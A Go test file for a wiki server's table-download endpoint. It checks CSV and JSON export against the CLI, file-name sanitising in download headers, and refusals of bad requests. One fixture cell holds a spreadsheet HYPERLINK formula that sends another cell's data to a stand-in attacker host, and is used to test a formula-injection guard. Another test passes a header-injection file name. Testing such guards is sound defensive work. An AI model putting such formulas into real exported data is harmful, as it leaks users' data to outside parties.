package server

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

// expenses is a dataset with a cell an agent copied from a hostile email: a
// formula that would send another cell to an outside site.
const expenses = "---\ntype: dataset\n---\n# Expenses\n\n" +
	"| date | amount | note |\n|---|---|---|\n" +
	"| 2026-11-01 | -3 | =HYPERLINK(\"https://evil.example/?d=\"&C3,\"Invoice\") |\n" +
	"| 2026-11-02 | 12.5 | lunch, with \"quotes\" |\n"

func fetchTable(t *testing.T, srv *Server, path string) *httptest.ResponseRecorder {
	t.Helper()
	rec := httptest.NewRecorder()
	srv.ServeHTTP(rec, browserRequest(srv, http.MethodGet, path, nil))
	return rec
}

var (
	wikiOnce sync.Once
	wikiDir  string // holds the built CLI; TestMain removes it
	wikiBin  string
	wikiErr  error
)

func TestMain(m *testing.M) {
	code := m.Run()
	if wikiDir != "" {
		os.RemoveAll(wikiDir)
	}
	os.Exit(code)
}

// wikiCLI builds the `wiki` command from the module this repository builds
// against, once, so a test can compare with what `wiki table` prints.
func wikiCLI(t *testing.T) string {
	t.Helper()
	wikiOnce.Do(func() {
		dir, err := exec.Command("go", "list", "-m", "-f", "{{.Dir}}", "github.com/agentic-wiki/wiki").Output()
		if err != nil {
			wikiErr = err
			return
		}
		wikiDir, err = os.MkdirTemp("", "wiki-cli-")
		if err != nil {
			wikiErr = err
			return
		}
		wikiBin = filepath.Join(wikiDir, "wiki")
		build := exec.Command("go", "build", "-o", wikiBin, "./cmd/wiki")
		build.Dir = strings.TrimSpace(string(dir))
		build.Env = append(os.Environ(), "GOWORK=off")
		if b, err := build.CombinedOutput(); err != nil {
			wikiErr = &exec.ExitError{Stderr: b}
		}
	})
	if wikiErr != nil {
		t.Fatalf("building wiki: %v", wikiErr)
	}
	return wikiBin
}

// The app's download is exactly what `wiki table --format csv|json` prints:
// one writer, the formula guard included, as an attachment with a safe name.
func TestADatasetDownloadsAsTheCLIPrintsIt(t *testing.T) {
	cli := wikiCLI(t)
	for mode, srv := range bothModes(t) {
		writeFile(t, srv, "money/expenses.md", expenses)
		for format, contentType := range map[string]string{"csv": "text/csv; charset=utf-8", "json": "application/json; charset=utf-8"} {
			rec := fetchTable(t, srv, "/api/table/money/expenses.md?format="+format)
			if rec.Code != http.StatusOK {
				t.Fatalf("%s %s: %d %s", mode, format, rec.Code, rec.Body)
			}
			cmd := exec.Command(cli, "table", "money/expenses.md", "--format", format)
			cmd.Dir = srv.store.Dir
			want, err := cmd.Output()
			if err != nil {
				t.Fatalf("wiki table: %v", err)
			}
			if rec.Body.String() != string(want) {
				t.Errorf("%s %s:\n%q\nwant what wiki table prints:\n%q", mode, format, rec.Body, want)
			}
			h := rec.Header()
			if h.Get("Content-Type") != contentType || h.Get("X-Content-Type-Options") != "nosniff" ||
				h.Get("Content-Disposition") != `attachment; filename="expenses.`+format+`"; filename*=UTF-8''expenses.`+format || h.Get("Cache-Control") != "no-store" {
				t.Errorf("%s %s headers: %v", mode, format, h)
			}
		}
		// Whatever the quoting: wiki v0.22.0 quotes every CSV field, earlier
		// versions only the fields that need it.
		if csv := fetchTable(t, srv, "/api/table/money/expenses.md?format=csv").Body.String(); !strings.Contains(csv, `'=HYPERLINK(`) || !strings.Contains(csv, "-3") || strings.Contains(csv, "'-3") {
			t.Errorf("%s: the formula guard: %q", mode, csv)
		}
	}
}

// The file name keeps only letters, digits, `.`, `_` and `-`, so nothing in a
// page's name can break out of the header.
func TestTheDownloadNameIsSafe(t *testing.T) {
	for name, want := range map[string]string{
		`a "b";c.md`:      "a-b-c",
		"Ünïcode café.md": "n-code-caf",
		"...md":           "dataset",
		"2026-11_q4.md":   "2026-11_q4",
	} {
		if got := downloadName(name); got != want {
			t.Errorf("%q: %q, want %q", name, got, want)
		}
	}
}

// The header carries the real name too, percent-encoded (RFC 6266), for a
// browser to save "Despeses d'octubre" under its own name; filename= stays
// the safe ASCII one.
func TestTheDownloadKeepsTheRealName(t *testing.T) {
	srv := newTestServer(t)
	writeFile(t, srv, "Despeses d'octubre.md", expenses)
	rec := fetchTable(t, srv, "/api/table/Despeses%20d%27octubre.md?format=csv")
	want := `attachment; filename="Despeses-d-octubre.csv"; filename*=UTF-8''Despeses%20d%27octubre.csv`
	if got := rec.Header().Get("Content-Disposition"); rec.Code != http.StatusOK || got != want {
		t.Errorf("%d %q, want %q", rec.Code, got, want)
	}
	if got := contentDisposition("/notes/a\"b\r\n;é.md", "csv"); got != `attachment; filename="a-b.csv"; filename*=UTF-8''a%22b%0D%0A%3B%C3%A9.csv` {
		t.Errorf("a hostile name: %q", got)
	}
}

// A page with no table, or several, a format other than csv or json, or a
// path that isn't an entry, gets no file. Downloading is a read: allowed on a
// read-only network bind, behind the same token.
func TestTableDownloadRefusals(t *testing.T) {
	srv := newTestServer(t)
	writeFile(t, srv, "two.md", "---\ntype: dataset\n---\n| a |\n|---|\n| 1 |\n\n| b |\n|---|\n| 2 |\n")
	writeFile(t, srv, "data.md", expenses)
	for path, want := range map[string]int{
		"/api/table/notes/a.md?format=csv": http.StatusNotFound,
		"/api/table/two.md?format=csv":     http.StatusUnprocessableEntity,
		"/api/table/data.md?format=xlsx":   http.StatusBadRequest,
		"/api/table/data.md":               http.StatusBadRequest,
		"/api/table/missing.md?format=csv": http.StatusNotFound,
		"/api/table/.env?format=csv":       http.StatusNotFound,
	} {
		if rec := fetchTable(t, srv, path); rec.Code != want {
			t.Errorf("%s: %d, want %d (%s)", path, rec.Code, want, rec.Body)
		}
	}
	// The reason reads after the UI's "Can't download: " (Dessy).
	for path, want := range map[string]string{
		"/api/table/two.md?format=csv":     "this page has 2 tables, and a dataset holds one.",
		"/api/table/notes/a.md?format=csv": "this page has no table.",
	} {
		var body errorBody
		if rec := fetchTable(t, srv, path); json.Unmarshal(rec.Body.Bytes(), &body) != nil || body.Error != want {
			t.Errorf("%s: %q, want %q", path, rec.Body, want)
		}
	}
	if rec := serve(srv, unauthenticated(srv, http.MethodGet, "/api/table/data.md?format=csv", nil)); rec.Code != http.StatusUnauthorized {
		t.Errorf("without the token: %d", rec.Code)
	}
}
